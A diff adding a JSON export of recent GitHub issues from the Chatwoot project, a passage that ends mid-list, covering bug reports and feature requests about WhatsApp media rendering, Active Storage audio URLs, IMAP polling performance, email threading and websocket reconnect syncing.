@@ -1,0 +1,352 @@
+[
+    {
+        "id": 4875396511,
+        "number": 15007,
+        "title": "Image attachment shows \"Failed to load\" on first render when sent via WhatsApp Cloud API — Vue component re-mounts on WebSocket status update, aborting the in-flight request",
+        "state": "open",
+        "created_at": "2026-07-13T16:03:48Z",
+        "updated_at": "2026-07-13T16:03:48Z",
+        "closed_at": null,
+        "author": "ErnaneJ",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nWhen an agent sends an image via a WhatsApp Cloud API inbox, the message bubble immediately shows a \"Failed to load\" error instead of the image thumbnail. The image is delivered to the WhatsApp recipient correctly. After a page refresh (F5), the image displays normally in the conversation.\n\n### To Reproduce\n\n1. Open a WhatsApp Cloud API conversation in Chatwoot with DevTools Network tab open\n2. Send an image attachment from the agent side\n3. The message bubble shows a \"Failed to load\" error icon instead of the image\n4. In DevTools Network, observe two requests for the same image URL: the first is cancelled with no response body, the second (triggered by clicking the error area) returns 200 OK with valid image data\n5. Press F5 — the image displays correctly\n\n### Expected behavior\n\nThe image thumbnail displays in the message bubble immediately after sending, without requiring a page refresh or a manual click.\n\nEnvironment: Self-hosted (Docker Compose)\n\n### Environment\n\nOther [please specify in the description]\n\n### Cloud Provider\n\nDigitalOcean\n\n### Platform\n\nBrowser\n\n### Operating system\n\nUbuntu 22.04\n\n### Browser and version\n\nChrome 136\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\nConfirmed via DevTools. Two network requests are made for the same image URL:\n\n- First request: cancelled/aborted — Response tab shows no data (\"Nothing to preview\"). This triggers the <img> element's onerror event.\n- Second request (after clicking the error area): returns HTTP 200 with valid PNG binary (confirmed by 89 50 4E 47 magic bytes in the Response tab).\n\nThe first request is aborted because a WebSocket message_updated event arrives while the image is loading (status changes from sending to sent). This triggers a Vue component re-render that destroys and re-creates the <img> element, aborting the in-flight HTTP request. Once onerror fires, the component enters a permanent error state and does not recover even after the image loads successfully on subsequent requests.\n\nThe image IS delivered to the WhatsApp recipient correctly — this is a pure UI rendering bug. The fix should stabilize the media component's key so that message status transitions (sending → sent → delivered) do not cause the <img> element to unmount mid-request.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/15007"
+    },
+    {
+        "id": 4875350599,
+        "number": 15006,
+        "title": "Attachment#inline_audio_url hardcodes rails_storage_redirect_url, ignoring resolve_model_to_route = :rails_storage_proxy",
+        "state": "open",
+        "created_at": "2026-07-13T15:58:21Z",
+        "updated_at": "2026-07-13T15:59:39Z",
+        "closed_at": null,
+        "author": "ErnaneJ",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\n`Attachment#inline_audio_url` explicitly calls `rails_storage_redirect_url`, bypassing the `config.active_storage.resolve_model_to_route` setting entirely. When `resolve_model_to_route = :rails_storage_proxy` is configured (required for S3 setups to avoid CORS/ORB failures), audio URLs still point directly to S3 instead of going through the Rails proxy. Chrome blocks the cross-origin range request with `ERR_BLOCKED_BY_ORB` and audio playback fails.\n\n**Environment**: Self-hosted (Docker Compose)\n\n### To Reproduce\n\n1. Set `config.active_storage.resolve_model_to_route = :rails_storage_proxy` (required when using S3 to avoid CORS issues)\n2. Configure `ACTIVE_STORAGE_SERVICE=amazon`\n3. Receive an audio message from any channel\n4. Inspect the audio player URL in DevTools. it points directly to S3, not to the Rails proxy\n5. Chrome blocks the range request: `ERR_BLOCKED_BY_ORB`, audio fails to play\n\n### Expected behavior\n\nAudio URLs respect `resolve_model_to_route` and go through the Rails proxy, just like `file_url` does.\n\n### Environment\n\nOther [please specify in the description]\n\n### Cloud Provider\n\nDigitalOcean\n\n### Platform\n\nBrowser\n\n### Operating system\n\nUbuntu 22.04\n\n### Browser and version\n\nChrome 136\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\nThe inconsistency is in `app/models/attachment.rb`. `file_url` uses `url_for(file)`, which respects the configured route. `inline_audio_url` does not:\n\n```ruby\n# respects config ✓\ndef file_url\n  url_for(file)\nend\n\n# hardcoded, ignores config ✗\ndef inline_audio_url\n  rails_storage_redirect_url(file, disposition: 'inline')\nend\n```\nFix is one line:\n```ruby\ndef inline_audio_url\n  return '' unless file.attached?\n  url_for(file)\nend\n```\n\nAlso related: `normalize_opus_content_type` in `config/initializers/active_storage.rb` updates the database blob record from `audio/opus` to `audio/ogg` before sending to Meta/WhatsApp, but does not update the S3 object metadata. The Meta API downloads the file directly from S3, receives `Content-Type: audio/opus`, and rejects it with error **131053** (\"Unsupported Voice mime type\"). The S3 object needs an in-place copy with metadata_directive: 'REPLACE' to fix the Content-Type at rest.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/15006"
+    },
+    {
+        "id": 4870254528,
+        "number": 14997,
+        "title": "[please ignore] created in wrong repo by mistake",
+        "state": "closed",
+        "created_at": "2026-07-13T04:00:51Z",
+        "updated_at": "2026-07-13T04:01:06Z",
+        "closed_at": "2026-07-13T04:01:06Z",
+        "author": "jinl0ng",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "Apologies — this was created in the wrong repository by mistake. Please ignore.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14997"
+    },
+    {
+        "id": 4857911962,
+        "number": 14993,
+        "title": "Feature request: Group emails with the same subject into a single conversation thread",
+        "state": "open",
+        "created_at": "2026-07-10T19:07:58Z",
+        "updated_at": "2026-07-10T19:07:58Z",
+        "closed_at": null,
+        "author": "chumaty",
+        "comments": 0,
+        "labels": [
+            "feature-request"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\nChatwoot currently creates a separate conversation for every incoming email when the messages do not contain matching In-Reply-To or References headers, even if they have the same sender and the same subject.\n\nSome services send each notification as a completely new email instead of a proper email reply. For example, multiple messages may have the same subject:\n\nNew chat message for order #59016723331\n\nAlthough all these emails relate to the same order and the same customer conversation, Chatwoot displays every email as a separate conversation.\n\nThis makes the inbox difficult to use because agents see many duplicate-looking conversations and must open each one separately to understand the full history. There is no convenient way to read the messages as one continuous correspondence.\n\nEmail clients such as Gmail and Outlook group related emails into conversation threads, which makes the full communication history much easier to follow.\n\n<img width=\"140\" height=\"65\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/2ea829ac-9d0a-4cb4-8916-95fe9c02a5fb\" />\n<img width=\"139\" height=\"65\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/df7a65e5-7e7f-4e20-99b8-75024ca82d77\" />\n\n### Describe the solution you'd like\n\nPlease add an option to group related incoming emails into a single Chatwoot conversation based on their subject, similar to conversation view in Gmail or Outlook.\n\nThe grouping could use a normalized email subject by removing prefixes such as:\n\nRe:\nFwd:\nFW:\n\nTo prevent unrelated emails from being merged, the grouping rules could also consider:\n\nthe inbox;\nsender or contact;\nrecipients;\nnormalized subject;\na configurable time period;\nan identifier extracted from the subject, such as an order number;\nexisting Message-ID, In-Reply-To, and References headers when available.\n\nFor example, all emails with this subject:\n\nNew chat message for order #59016723331\n\nshould appear inside one conversation as a chronological message thread instead of creating a new Chatwoot conversation for every incoming email.\n\nIt would also be useful to make this behavior configurable for each email inbox, because some users may prefer the current behavior while others need Gmail- or Outlook-style email threading.\n\n### Describe alternatives you've considered\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14993"
+    },
+    {
+        "id": 4855035706,
+        "number": 14986,
+        "title": "Email Conversation UX Improvement - Long Threads/Messages",
+        "state": "open",
+        "created_at": "2026-07-10T12:37:14Z",
+        "updated_at": "2026-07-10T12:37:14Z",
+        "closed_at": null,
+        "author": "gui-bakaukas-qitech",
+        "comments": 0,
+        "labels": [
+            "feature-request"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\nReading long email conversations in the agent dashboard becomes hard to follow. Every email message in a conversation renders **fully expanded**, stacked one after another. On a thread with many replies (and with quoted history inside each message) the view turns into a long, noisy wall of text where it's difficult to see **how many messages there are, who replied, and where the latest reply is**.\n\nToday the only per-message affordance is a **\"show/hide quotation\"** toggle for the quoted portion inside a single message (in `app/javascript/dashboard/components-next/message/bubbles/Email/Index.vue`). There is:\n\n- **No way to collapse a whole message** to a compact header (the message body always takes full height), and\n- **No thread-level control** to collapse/expand all messages at once.\n\nSo a 15-message thread is 15 full-height blocks the agent has to scroll through every time, even to find the one new reply at the bottom.\n\n\n### Describe the solution you'd like\n\nBring the **Gmail-style collapsed-thread reading experience** to email conversations:\n\n1. **Collapsible messages.** Each email message can collapse to a **single-line header row** — sender name/email, a short snippet of the body, timestamp, and an attachment/paperclip indicator — and expand back to the full message on click.\n\n   ```\n   Collapsed thread                                   Expanded (one message open)\n   ┌──────────────────────────────────────────┐      ┌──────────────────────────────────────────┐\n   │ ▸ Alice <alice@acme.com>   \"…thanks, that │      │ ▸ Alice <alice@acme.com>        09:12  📎 │\n   │   works for me\"                    09:12   │      │ ▸ Bob <bob@acme.com>            09:20     │\n   │ ▸ Bob <bob@acme.com>       \"can we move…\" │      │ ▾ Carol <carol@acme.com>       09:41      │\n   │                                    09:20   │      │     Hi both, confirming the transfer …    │\n   │ ▾ Carol <carol@acme.com>   (latest) 09:41 │      │     [full body, with the existing quote   │\n   │     Hi both, confirming …                  │      │      show/hide toggle still available]    │\n   └──────────────────────────────────────────┘      └──────────────────────────────────────────┘\n   ```\n\n2. **Smart defaults (Gmail behavior).** On opening a conversation, **collapse all messages except the latest** (and keep any unread ones expanded), so the agent lands on the newest reply without scrolling. This is the single biggest readability win.\n\n3. **Thread-level \"Expand all / Collapse all\" control** in the conversation header/toolbar, so an agent can flip the whole thread at once.\n\n4. **Keep the existing quote toggle** inside an expanded message (the current show/hide-quotation behavior stays; collapse operates at the message level, above it).\n\nThis mirrors how Gmail renders a thread: a stack of collapsed one-liners with the most recent message open, click to \n\n### Describe alternatives you've considered\n\n- **Only the current quote toggle** — helps a bit within one message, but doesn't reduce the number of full-height blocks, so long threads are still a wall.\n- **Relying on the sub-thread grouping / faithful-HTML work** — complementary (better *within* a message), but doesn't address the *thread-level* navigation problem this request is about.\n- **Just scrolling** — the status quo; doesn't scale past a handful of messages.\n\n\n### Additional context\n\n**Where this lives in code (v4.14.2-ce, still current on `develop`):**\n\n- Email message bubble: `app/javascript/dashboard/components-next/message/bubbles/Email/Index.vue` — renders the body and already owns the per-message **show/hide quotation** toggle. A per-message **collapsed/expanded** state (defaulting to collapsed for all-but-latest) would live here, with the collapsed view showing a compact header.\n- Message header meta: `app/javascript/dashboard/components-next/message/bubbles/Email/EmailMeta.vue` — already computes sender/subject; it's the natural source for the collapsed-row label (sender + timestamp + attachment indicator). (Note: it currently only resolves a sender *name* when the sender equals the conversation contact, so multi-participant threads can show a blank name — worth fixing alongside, so collapsed rows always show *who* sent each message.)\n- Body/quote handling: `app/javascript/dashboard/helper/emailQuoteExtractor.js` — the snippet for a collapsed row can reuse the de-quoted body text this already produces.\n\n**Scope note:** this is a **frontend-only** change (Vue), no API/schema changes — collapse state is view state. It's additive and backward-compatible: default-collapse-all-but-latest can be the new default, or gated behind a toggle if maintainers prefer to preserve current behavior.\n\n**Impact:** email is a first-class channel in Chatwoot, and long email threads (support, operations, back-office) are common. Gmail-style collapsing is the standard mental model users already have for reading email, and it dramatically improves scanability of long conversations for agents.\n",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14986"
+    },
+    {
+        "id": 4854928715,
+        "number": 14983,
+        "title": "Email Pooling Delay at High Volume",
+        "state": "open",
+        "created_at": "2026-07-10T12:21:52Z",
+        "updated_at": "2026-07-10T12:21:52Z",
+        "closed_at": null,
+        "author": "gui-bakaukas-qitech",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nThe IMAP email channel fetch is **stateless**: on every poll it runs `SEARCH SINCE <today - 1 day>` and re-reads the *entire* trailing-day window of the mailbox, then relies on Message-ID de-duplication to avoid re-creating conversations. There is no fetch cursor (no stored UID, no `\\Seen`/label, `BODY.PEEK` is used so nothing is marked read).\n\nThis makes each poll cost `O(messages received in the last day)` — paid **every polling cycle (~1 min), indefinitely**, even when almost nothing is new. On a high-volume inbox this degrades badly:\n\n- The per-poll fetch fetches and parses the header of *every* message in the window and does a `find_by(source_id:)` per message just to discard the ones already imported.\n- New mail is the most recent, so it sits at the **end** of the (oldest-first) scan and is only processed after the whole backlog is walked.\n- Result: fetch durations of **100–140 s** and **~15–20 minutes of ingestion delay** between an email arriving and the conversation being created.\n\nA telltale sign is that the `found=` count in the logs is **constant across every poll** for a given inbox (it reflects the window size, not new mail):\n\n```\n[IMAP::FETCH_EMAIL_SERVICE] Fetching mails from high-volume@example.com, found 878.\n... (next poll, ~1 min later) ...\n[IMAP::FETCH_EMAIL_SERVICE] Fetching mails from high-volume@example.com, found 878.\n[ActiveJob] [Inboxes::FetchImapEmailsJob] Performed Inboxes::FetchImapEmailsJob ... in 133861.67ms\n```\n\nThis affects all IMAP-based channels equally — `Imap::FetchEmailService` (password), `Imap::GoogleFetchEmailService`, and `Imap::MicrosoftFetchEmailService` all inherit the same `Imap::BaseFetchEmailService#fetch_mail_for_channel`, so the Google/Microsoft \"Sign in with…\" integrations do **not** avoid it (they only change authentication).\n\n\n### To Reproduce\n\nI have a working implementation running against `v4.14.2-ce`;\n\n1. Connect an email inbox via IMAP to a mailbox that receives a high daily volume (e.g. ~2,000+ messages/day — an operations/notifications mailbox).\n2. Let it run and watch the worker logs (the `Inboxes::FetchImapEmailsJob` on the `scheduled_jobs` queue).\n3. Observe that every poll logs the same `found=N` (≈ the number of messages in the last day), regardless of how few are actually new.\n4. Observe fetch durations climbing into the tens/hundreds of seconds (`Performed Inboxes::FetchImapEmailsJob ... in <ms>`).\n5. Send a new email to that mailbox and measure the delay until the conversation appears — it can be many minutes, bounded by the time the fetch takes to walk the whole window.\n\n\n### Expected behavior\n\n\nFetching should be **incremental** — cost proportional to the number of *new* messages since the last successful poll (`O(new)`), not to the size of the trailing-day window (`O(messages/day)`). A newly arrived email should become a conversation within seconds regardless of how much historical mail sits in the mailbox, and repeated polls of an idle inbox should do near-zero work.\n\n\n### Environment\n\nKubernetes\n\n### Cloud Provider\n\nGCP\n\n### Platform\n\nBrowser\n\n### Operating system\n\n Linux (container)\n\n### Browser and version\n\nN/A (backend email ingestion)\n\n### Docker (if applicable)\n\n- Chatwoot image: `chatwoot/chatwoot:v4.14.2-ce`\n- Also present on `develop` — `app/services/imap/base_fetch_email_service.rb` still uses `search(['SINCE', since])` with no cursor as of this writing.\n\n\n### Additional context\n\n\n**Root cause (code).** In `app/services/imap/base_fetch_email_service.rb`:\n\n- `fetch_available_mail_sequence_numbers` → `imap_client.search(['SINCE', since])`.\n- `since` → `Time.zone.today - (interval || 1)` and is **date-granular** (`strftime('%d-%b-%Y')`), so the smallest possible window is ~1 day; it cannot be tuned smaller.\n- The whole window is walked (`each_slice(MAX_MESSAGES_PER_SYNC)`), each message's header is fetched (`BODY.PEEK[HEADER]`) and de-duplicated via `email_already_present?` (`find_by(source_id:)`, one query per message).\n- `MAX_MESSAGES_PER_SYNC = 500` caps *new* messages per sync but does nothing to reduce the re-scan of already-imported ones.\n- No cursor is persisted anywhere; nothing is marked on the server (`BODY.PEEK` intentionally does not set `\\Seen`).\n\nBecause there is no forward cursor, the service cannot tell \"already processed\" from \"new\" without re-examining the whole window every time — which is the entire cost.\n\n**Proposed fix — incremental fetch by IMAP UID.** IMAP UIDs are monotonic within a mailbox (scoped by `UIDVALIDITY`), which is exactly the primitive needed for an incremental cursor:\n\n1. Persist the last processed UID and the mailbox `UIDVALIDITY` per channel. `channel_email.provider_config` (jsonb) already exists, so **no migration is required**:\n   ```ruby\n   # after a successful sync\n   channel.provider_config['imap_cursor'] = { 'last_uid' => max_uid, 'uidvalidity' => uidvalidity }\n   ```\n2. Fetch only new UIDs instead of the whole window:\n   ```ruby\n   def fetch_available_mail_uids\n     last_uid = cursor['last_uid'].to_i\n     if incremental? && last_uid.positive? && cursor['uidvalidity'].to_i == current_uidvalidity.to_i\n       # `N:*` always includes the highest UID even when none are >= N, so filter.\n       imap_client.uid_search(['UID', \"#{last_uid + 1}:*\"]).select { |uid| uid > last_uid }\n     else\n       imap_client.uid_search(['SINCE', since]) # first run / UIDVALIDITY reset / periodic safety sweep\n     end\n   end\n   ```\n   (Header/body fetches switch to `uid_fetch`.)\n\n**Correctness / safety considerations** (handled in the proposed change):\n- **UIDVALIDITY change** → treat the cursor as invalid and fall back to a full `SINCE` scan, then re-seed.\n- **`N:*` quirk** → always filter `uid > last_uid`.\n- **First run / no cursor** → seed from a full `SINCE` scan, then record the max UID.\n- **Cap interaction** → advance the cursor only to the highest UID actually *examined*, so a sync that stops at `MAX_MESSAGES_PER_SYNC` never skips the messages it didn't reach.\n- **Self-heal** → keep the existing Message-ID de-dup as an idempotency backstop, and run a periodic full `SINCE` sweep (e.g. every N minutes) so a transient failure can't permanently drop a message.\n- **Rollback** → gate behind an env flag (default on) so the previous behavior is one setting away.\n\nThis turns the per-poll cost from `O(messages in the last day)` into `O(new since last poll)`, eliminating the multi-minute ingestion delay and the constant redundant IMAP + DB work on high-volume inboxes. It is a backend-only change to a single file (all three IMAP subclasses inherit it) and needs no schema migration.\n",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14983"
+    },
+    {
+        "id": 4843818131,
+        "number": 14965,
+        "title": "Contact search results show initials instead of existing contact avatars",
+        "state": "open",
+        "created_at": "2026-07-09T06:34:08Z",
+        "updated_at": "2026-07-09T06:34:08Z",
+        "closed_at": null,
+        "author": "KevinAsher",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nContact search results render fallback initials even when the contact already has an avatar. Opening the same contact detail page shows the avatar correctly, so the avatar is stored and available; it is just missing from the contact search response.\n\nProof from a local self-hosted v4.15.1 CE Docker setup, with identifying text blurred:\n\n![Contact search result uses initials while the contact detail has an avatar](https://raw.githubusercontent.com/KevinAsher/chatwoot/9344c3251e7a3c759a2c363a230ae434e98c06c5/docs/proof/search-contact-thumbnail-bug.gif)\n\n### To Reproduce\n\n1. Use a Chatwoot account with contacts that have uploaded/synced avatars.\n2. Open global search and search for a contact.\n3. Switch to the `Contacts` tab in search results.\n4. Notice the search result row shows the fallback initials avatar.\n5. Open the same contact.\n6. Notice the contact detail page shows the real avatar image.\n\n### Expected behavior\n\nContact search results should include and render the same contact avatar thumbnail that is available on the contact detail page.\n\n### Environment\n\nDocker\n\n### Cloud Provider\n\nOther [please specify in the description]\n\n### Platform\n\nBrowser\n\n### Operating system\n\nmacOS / Darwin 25.5.0 arm64\n\n### Browser and version\n\nChromium-based browser\n\n### Docker (if applicable)\n\n- Chatwoot image: `chatwoot/chatwoot:v4.15.1-ce`\n- Docker Server Version: `29.4.0`\n- Docker Compose: `v5.1.2`\n\n### Additional context\n\nThe current contact search serializer returns contact identity fields but does not include `thumbnail`, while other contact-facing API responses do include the contact thumbnail/avatar URL. Adding `json.thumbnail contact.avatar_url` to `app/views/api/v1/accounts/search/_contact.json.jbuilder` fixes the listing UI for contacts that already have avatars.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14965"
+    },
+    {
+        "id": 4833845745,
+        "number": 14953,
+        "title": "WhatsApp incoming-to-incoming replies are not shown as quoted replies",
+        "state": "open",
+        "created_at": "2026-07-08T02:40:48Z",
+        "updated_at": "2026-07-08T02:42:42Z",
+        "closed_at": null,
+        "author": "mohamadibrahem",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nI use Chatwoot version | 4.15.1\n\nWhen a WhatsApp Cloud API customer replies to a previous incoming message that was originally sent by the same customer, Chatwoot does not display the reply as a quoted/replied message.\n\nThe issue only happens for incoming-to-incoming replies:\n\nCustomer message → saved in Chatwoot as incoming\nCustomer replies to that same previous message from WhatsApp → the new message arrives in Chatwoot, but it is not linked to the original message.\n\nHowever, replies to outgoing messages sent from Chatwoot work correctly:\n\nChatwoot agent message → customer replies from WhatsApp → Chatwoot correctly shows the quoted reply.\n\nFrom the webhook payload, Meta sends the reply context correctly. For example, the reply message contains:\n\n\"context\": {\n\"from\": \"2010***********\",\n\"from_user_id\": \"EG.1442***********\",\n\"id\": \"wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA==\"\n}\n\nThe new reply message is saved in Chatwoot, but its reply attributes are not linked:\n\n\"content_attributes\": {\n\"in_reply_to_external_id\": nil,\n\"in_reply_to\": nil\n}\n\nThe original incoming message exists in Chatwoot, but its stored source_id is different from the context.id sent by Meta.\n\nOriginal incoming message saved in Chatwoot:\n\ncontent: \"مرحبا\"\nsource_id: \"wamid.HBgMMjAxMDIwNzA5ODU2FQIAEhggQTU2NkI1NDVDMjQyREIzMzI3NTVGQzI4MUI3QTVFOTgA\"\n\nReply message from WhatsApp:\n\ncontent: \"اهلا\"\ncontext.id: \"wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA==\"\n\nDatabase check:\n\nMessage.find_by(\nsource_id: \"wamid.HBgMMjAxMDIwNzA5ODU2FQIAEhggQTU2NkI1NDVDMjQyREIzMzI3NTVGQzI4MUI3QTVFOTgA\"\n)\n\nreturns the original incoming message.\n\nBut:\n\nMessage.find_by(\nsource_id: \"wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA==\"\n)\n\nreturns nil.\n\nBecause of this mismatch, Chatwoot cannot find the original incoming message and does not populate in_reply_to or in_reply_to_external_id.\n\nExpected behavior:\nChatwoot should correctly show quoted replies when a WhatsApp customer replies to their own previous incoming message, the same way it already works when the customer replies to an outgoing Chatwoot message.\n\nActual behavior:\nThe reply message is received and displayed as a normal incoming message, but the quoted/replied message is not shown in Chatwoot.\n\n\n### To Reproduce\n\n1. Configure a WhatsApp Cloud API inbox in Chatwoot.\n\n2. From a WhatsApp customer account, send a normal text message to the Chatwoot WhatsApp number.\n   Example message:\n   \"مرحبا\"\n\n3. Confirm that the message is received in Chatwoot as an incoming message.\n\n4. From the same WhatsApp customer account, long-press the previous message \"مرحبا\" inside WhatsApp and choose Reply.\n\n5. Send a reply message.\n   Example reply:\n   \"اهلا\"\n\n6. Check the WhatsApp webhook payload. Meta sends a valid reply context in the new message:\n\n\"context\": {\n\"from\": \"2010*********\",\n\"from_user_id\": \"EG.14427***********\",\n\"id\": \"wamid.HBgTRUcuMTQ0MjczODIzMDk0MTAwMhUUABIYIEE1NjZCNTQ1QzI0MkRCMzMyNzU1RkMyODFCN0E1RTk4AA==\"\n}\n\n7. Open the same conversation in Chatwoot.\n\n8. Notice that the reply message \"اهلا\" appears as a normal incoming message, but it is not displayed as a quoted/replied message linked to \"مرحبا\".\n\n9. Check the database record for the reply message:\n\nMessage.where(content: \"اهلا\").last.content_attributes\n\nActual result:\n\n{\n\"in_reply_to_external_id\": nil,\n\"in_reply_to\": nil\n}\n\n10. Compare this with replying to an outgoing message sent from Chatwoot. In that case, Chatwoot correctly fills in_reply_to_external_id and in_reply_to, and the quoted reply appears correctly.\n\n\n### Expected behavior\n\n_No response_\n\n### Environment\n\napp.chatwoot.com\n\n### Cloud Provider\n\nNone\n\n### Platform\n\nNone\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14953"
+    },
+    {
+        "id": 4826254181,
+        "number": 14942,
+        "title": "Missing empty line above email signature when replying to a customer",
+        "state": "open",
+        "created_at": "2026-07-07T07:25:38Z",
+        "updated_at": "2026-07-07T07:25:38Z",
+        "closed_at": null,
+        "author": "motomotolukas",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nAfter upgrading the newer version, there is an issue when replying to a customer.\n\nWhen the reply editor opens, the email signature is inserted too close to the message input area, and there is no empty editable line above the signature. Because of this, the agent cannot start writing the reply normally.\n\nTo write a message, the agent has to manually insert an empty line so that the signature moves down and there is space to type the response.\n\nThis worked correctly in previous versions.\n\n<img width=\"976\" height=\"752\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/93a22472-187a-4df5-8362-17311ac10214\" />\n\n### To Reproduce\n\nTry to replay with a signature\n\n### Expected behavior\n\n_No response_\n\n### Environment\n\nDocker\n\n### Cloud Provider\n\nNone\n\n### Platform\n\nBrowser\n\n### Operating system\n\n_No response_\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n_No response_",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14942"
+    },
+    {
+        "id": 4825792595,
+        "number": 14941,
+        "title": "Feature Request: Allow forwarding conversations/emails with a custom message and agent information",
+        "state": "open",
+        "created_at": "2026-07-07T06:14:29Z",
+        "updated_at": "2026-07-07T06:14:29Z",
+        "closed_at": null,
+        "author": "motomotolukas",
+        "comments": 0,
+        "labels": [
+            "feature-request"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Is your feature or enhancement related to a problem? Please describe.\n\nI would like to request an improvement to the current conversation/email forwarding feature in Chatwoot.\n\nAt the moment, it is possible to forward a conversation as a transcript, but there is no option to add a custom message or comment when forwarding it. Also, the recipient does not see which agent forwarded the conversation.\n\nBecause of this, the recipient receives the forwarded transcript without context. They do not know why they received it, what action is expected from them, or who forwarded it.\n\n### Describe the solution you'd like\n\nIt would be very useful if agents could forward a conversation/email and include:\n\nA custom message or comment above the forwarded transcript.\nThe name of the agent who forwarded it.\n\n### Describe alternatives you've considered\n\n_No response_\n\n### Additional context\n\nThis would make forwarded conversations much clearer and more useful for internal collaboration. The recipient would immediately understand:\n\nWho sent the forwarded conversation.\nWhy they received it.\nWhat they need to do next.\n\nThis would be a perfect improvement for teams that use Chatwoot for support, sales, operations, or internal escalation workflows.\n\nI had already raised this request before, and it also received interest from other users. I believe this feature would fully satisfy an important missing workflow in Chatwoot.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14941"
+    },
+    {
+        "id": 4817764505,
+        "number": 14934,
+        "title": "Agent misses another agent's reply after websocket reconnect until page refresh",
+        "state": "open",
+        "created_at": "2026-07-06T09:25:49Z",
+        "updated_at": "2026-07-06T09:25:49Z",
+        "closed_at": null,
+        "author": "0marAmara",
+        "comments": 0,
+        "labels": [
+            "Bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Describe the bug\n\nIn a shared inbox conversation, one agent can miss another agent's outbound reply in real time if their websocket connection drops and reconnects.\n\n  In the observed case:\n\n  - Agent 2 was logged in and had the conversation cached in the UI.\n  - Agent 2's `/cable` websocket disconnected.\n  - Agent 1 replied to the customer while Agent 2 was disconnected.\n  - The backend successfully created and broadcast the `message.created` event.\n  - Agent 2 reconnected, but the frontend reconnect recovery only fetched conversations updated within a very small window, `updated_within=26`.\n  - The missed conversation was older than that window, so Agent 2's UI remained stale.\n  - Agent 2 replied to the same customer without seeing Agent 1's previous reply.\n  - After refreshing the page, Agent 2 could see Agent 1's reply.\n\nThis appears to be a frontend sync/reconnect recovery issue, not a failed message creation or failed Sidekiq broadcast.\n\n### To Reproduce\n\n 1. Log in as Agent 1 and Agent 2.\n  2. Open or cache the same conversation in Agent 2's browser.\n  3. Interrupt Agent 2's websocket connection, for example by briefly disabling network access or causing `/cable` to disconnect.\n  4. While Agent 2 is disconnected, send a reply from Agent 1 in that conversation.\n  5. Restore Agent 2's connection and allow the app to reconnect.\n  6. Observe that the reconnect recovery may call the conversations API with a small `updated_within` value.\n  7. Open the conversation as Agent 2.\n  8. Observe that Agent 1's message may be missing until a full page refresh.\n\n### Expected behavior\n\nAfter reconnecting, Agent 2 should reliably see all messages that were created while the websocket was disconnected.\n\n  At minimum, opening an already-cached conversation after reconnect should sync messages from the server so the agent does not reply based on stale\n  conversation history.\n\n### Environment\n\nLinux VM\n\n### Cloud Provider\n\nAWS\n\n### Platform\n\nBrowser\n\n### Operating system\n\nLinux VM on AWS EC2\n\n### Browser and version\n\n_No response_\n\n### Docker (if applicable)\n\n_No response_\n\n### Additional context\n\n**Additional Context**\n  Relevant log timeline, with sensitive values redacted:\n```\n  2026-07-04T10:52:28Z\n  Finished \"/cable\" [WebSocket] for Agent 2 IP\n  RoomChannel stopped streaming from Agent 2 pubsub token\n\n  2026-07-04T10:55:43Z\n  Agent 1 POST /api/v1/accounts/1/conversations/653/messages\n  message.created broadcast enqueued for message id 4527\n  ActionCableBroadcastJob performed successfully in 3.66ms\n\n  2026-07-04T11:00:54Z\n  Agent 2 reconnected to /cable\n  RoomChannel streaming resumed for Agent 2 pubsub token\n\n  2026-07-04T11:00:55Z\n  GET /api/v1/accounts/1/conversations?status=open&assignee_type=all&sort_by=last_activity_at_desc&updated_within=26\n\n  2026-07-04T11:11:32Z\n  Agent 2 POST /api/v1/accounts/1/conversations/653/messages\n  No preceding GET /api/v1/accounts/1/conversations/653/messages from Agent 2 was seen before this reply.\n```\n  The likely weak point is reconnect recovery relying on a very small client-calculated updated_within value. A possible fix would be to use a minimum reconnect\n  lookback window, or to force a message sync when opening an already-cached active conversation after reconnect.",
+        "url": "https://github.com/chatwoot/chatwoot/issues/14934"
+    },
+    {
